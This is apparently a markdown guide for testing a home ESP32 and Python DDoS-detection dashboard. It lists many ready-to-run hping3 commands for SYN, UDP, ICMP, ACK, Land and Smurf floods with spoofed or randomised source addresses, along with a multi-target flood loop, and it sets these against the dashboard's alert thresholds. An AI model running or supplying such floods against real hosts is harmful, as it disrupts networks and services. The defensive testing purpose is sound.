# DDoS Testing Guide with hping3

⚠️ **WARNING:** Only test on YOUR OWN network with YOUR OWN devices. Never attack others' networks!

## 📋 Prerequisites

First, install hping3:
```bash
sudo apt-get install hping3
```

---

## 🎯 DDoS Test Scenarios

### 1️⃣ **SYN Flood Attack** (Most Common)
Floods target with TCP SYN packets to exhaust connection table.

#### Light SYN Flood (Testing):
```bash
sudo hping3 -S -p 80 --flood --rand-source 192.168.1.1
```

#### Medium SYN Flood:
```bash
sudo hping3 -S -p 80 --faster --rand-source 192.168.1.1
```

#### Heavy SYN Flood:
```bash
sudo hping3 -S -p 80 --flood -d 1200 --rand-source 192.168.1.1
```

**Flags:**
- `-S` = SYN flag
- `-p 80` = Target port 80
- `--flood` = Send packets as fast as possible
- `--faster` = Send 10x faster than normal
- `--rand-source` = Randomize source IP
- `-d 1200` = Packet size 1200 bytes

---

### 2️⃣ **UDP Flood**
Floods target with UDP packets.

#### Basic UDP Flood:
```bash
sudo hping3 --udp -p 53 --flood --rand-source 192.168.1.1
```

#### Large UDP Packets:
```bash
sudo hping3 --udp -p 53 --flood -d 65000 --rand-source 192.168.1.1
```

#### Multi-port UDP Flood:
```bash
sudo hping3 --udp --scan 1-1000 --flood --rand-source 192.168.1.1
```

**Flags:**
- `--udp` = UDP mode
- `-p 53` = DNS port (or any port)
- `-d 65000` = Maximum UDP packet size

---

### 3️⃣ **ICMP Flood (Ping Flood)**
Floods target with ICMP echo requests.

#### Basic ICMP Flood:
```bash
sudo hping3 -1 --flood --rand-source 192.168.1.1
```

#### Large ICMP Packets:
```bash
sudo hping3 -1 --flood -d 65000 --rand-source 192.168.1.1
```

**Flags:**
- `-1` = ICMP mode
- `--flood` = Maximum speed

---

### 4️⃣ **ACK Flood**
Floods with TCP ACK packets (bypass some firewalls).

```bash
sudo hping3 -A -p 80 --flood --rand-source 192.168.1.1
```

**Flags:**
- `-A` = ACK flag

---

### 5️⃣ **Land Attack**
Sends packets where source = destination (can crash old systems).

```bash
sudo hping3 -S -p 80 --flood -a 192.168.1.1 192.168.1.1
```

**Flags:**
- `-a` = Spoof source address

---

### 6️⃣ **Smurf Attack Simulation**
ICMP flood from spoofed source.

```bash
sudo hping3 -1 --flood -a 192.168.1.1 192.168.1.255
```

---

### 7️⃣ **DNS Amplification Simulation**
```bash
sudo hping3 --udp -p 53 -d 512 --flood --rand-source 192.168.1.1
```

---

## 🧪 **Recommended Testing Sequence**

### Step 1: Light Test (Should NOT trigger alerts)
```bash
# Normal traffic - ~1000 packets
sudo hping3 -S -p 80 -c 1000 --fast 192.168.1.1
```
**Expected:** ✅ No alert (< 50,000 packets/20s)

---

### Step 2: Moderate Test (Should trigger MEDIUM alert)
```bash
# ~60,000 packets in 20s window
sudo timeout 20 sudo hping3 -S -p 80 --faster --rand-source 192.168.1.1
```
**Expected:** ⚠️ MEDIUM severity alert (50,000-100,000 packets)

---

### Step 3: Heavy Test (Should trigger HIGH alert)
```bash
# ~120,000 packets in 20s window
sudo timeout 20 sudo hping3 -S -p 80 --flood --rand-source 192.168.1.1
```
**Expected:** 🚨 HIGH severity alert (100,000-200,000 packets)

---

### Step 4: Critical Test (Should trigger CRITICAL alert)
```bash
# 200,000+ packets in 20s window
sudo timeout 20 sudo hping3 -S -p 80 --flood -d 1200 --rand-source 192.168.1.1
```
**Expected:** 🔴 CRITICAL alert (> 200,000 packets)

---

## 📊 **Expected Python Server Response**

Based on your thresholds in `python_p_server.py`:

| Packets/20s | Packets/sec | Alert Level | Description |
|-------------|-------------|-------------|-------------|
| < 50,000 | < 2,500 | ✅ None | Normal traffic |
| 50,000 - 100,000 | 2,500 - 5,000 | ⚠️ MEDIUM | Moderate traffic |
| 100,000 - 200,000 | 5,000 - 10,000 | 🚨 HIGH | High traffic |
| > 200,000 | > 10,000 | 🔴 CRITICAL | DDoS flood |

---

## 🎯 **Quick Test Commands**

### Test 1: Quick Burst (10 seconds)
```bash
sudo timeout 10 sudo hping3 -S -p 80 --flood 192.168.1.1
```

### Test 2: Controlled Rate (1000 pkt/s for 20s)
```bash
sudo hping3 -S -p 80 -i u1000 -c 20000 192.168.1.1
```
**Flag:** `-i u1000` = 1000 microsecond interval = 1000 pkt/s

### Test 3: Specific Packet Count
```bash
sudo hping3 -S -p 80 --faster -c 100000 192.168.1.1
```
**Flag:** `-c 100000` = Send exactly 100,000 packets

---

## 🛡️ **Testing Workflow**

1. **Start ESP32 monitoring** (it captures for 20 seconds)
2. **Wait for ESP32 to start DDoS detection phase**
3. **Run hping3 command** while ESP32 is capturing
4. **Check Python dashboard** at `http://localhost:5000`
5. **View alerts** in the dashboard

---

## 🔍 **Monitoring During Tests**

### Watch Python Server Logs:
```bash
# In the terminal where Python server is running
# You'll see:
📊 Analyse DDoS:
   - Total paquets: XXX,XXX (YYY pkt/s)
   - Source dominante: ZZ% du trafic
🚨 DDOS FLOOD detected!
```

### Watch ESP32 Serial Monitor:
```
📊 12500 paquets capturés (ch:1)...
📊 28340 paquets capturés (ch:6)...
✅ Total: 156789 paquets (7839 pkt/s)
```

---

## ⚡ **Advanced Examples**

### Randomized Multi-Protocol Attack:
```bash
# SYN + ACK + UDP mixed
sudo hping3 -S -A --udp -p 80 --flood --rand-source 192.168.1.1
```

### Fragmented Packet Flood:
```bash
sudo hping3 -S -p 80 --flood --frag --rand-source 192.168.1.1
```

### Multi-target Rotation:
```bash
# Attack multiple targets in rotation
for ip in 192.168.1.{1..10}; do
  sudo timeout 2 sudo hping3 -S --flood $ip &
done
```

---

## 📱 **Testing from Another Device (Recommended)**

For best results, run hping3 from another computer on the same network:

```bash
# From your laptop/another PC:
sudo hping3 -S -p 80 --flood 192.168.1.1
```

This simulates a real external attack and is captured more accurately by the ESP32.

---

## 🚫 **Stop Commands**

To stop any running flood:
```bash
# Press Ctrl+C or:
sudo pkill hping3
```

To limit test duration:
```bash
# Automatically stop after 20 seconds
sudo timeout 20 sudo hping3 -S --flood 192.168.1.1
```

---

## 🎓 **Understanding Results**

### ESP32 Captures:
- **Duration:** 20 seconds
- **Channels:** Rotates 1-13
- **Rate:** Raw WiFi packets (includes all network traffic)

### Python Analyzes:
- **Thresholds:** 50k, 100k, 200k packets
- **Source check:** Dominant source percentage
- **Alert types:** MEDIUM, HIGH, CRITICAL

---

## 📋 **Quick Reference Card**

```bash
# Light (Testing)        → No alert expected
sudo timeout 20 sudo hping3 -S -p 80 --fast 192.168.1.1

# Moderate (MEDIUM)      → ~60,000 packets
sudo timeout 20 sudo hping3 -S -p 80 --faster --rand-source 192.168.1.1

# Heavy (HIGH)           → ~120,000 packets  
sudo timeout 20 sudo hping3 -S -p 80 --flood --rand-source 192.168.1.1

# Critical (CRITICAL)    → 200,000+ packets
sudo timeout 20 sudo hping3 -S -p 80 --flood -d 1200 --rand-source 192.168.1.1
```

---

## ⚠️ **Important Safety Notes**

1. **Only test on YOUR network** with YOUR devices
2. **Warn other users** before testing (may disrupt service)
3. **Don't test on production systems**
4. **Use `timeout` command** to auto-stop tests
5. **Test during low-usage hours**
6. **Have a way to stop the test** (Ctrl+C, pkill)

---

## 🎯 **Target IP Selection**

Replace `192.168.1.1` with:
- **Router:** `192.168.1.1` (gateway)
- **Your PC:** `192.168.1.178` (where Python server runs)
- **Test device:** Any device you own on the network

---

**Happy (ethical) testing!** 🛡️🔍
